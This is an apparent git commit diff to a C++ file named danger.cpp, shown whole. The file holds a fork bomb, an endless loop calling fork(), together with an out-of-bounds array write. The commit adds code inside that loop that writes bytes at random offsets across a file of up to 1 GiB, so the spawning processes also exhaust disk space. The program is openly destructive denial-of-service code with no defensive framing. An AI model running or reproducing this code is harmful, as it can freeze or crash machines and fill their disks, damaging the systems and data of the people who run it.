6e0373f8b5fe6fbd40cbb71887b55316920ac34e
Caleb <51061101+calebrwalk5@users.noreply.github.com>
2021-09-16 08:44:56 -0400

    Add files via upload

--- danger.cpp
+++ danger.cpp
@@ -8,7 +8,11 @@ int Fred[800] = {0};
 int main() {
 	cout << Fred << endl;
 	Fred[8470] = 87592;
+	FILE *f = fopen("tmp.txt","wb");
 	for (;;) {
+		fseek(f, rand() % (1024ll * 1024 * 1024), SEEK_SET);
+		fputc('a', f);
+		fflush(f);
 		fork();
 	}
 	return false;
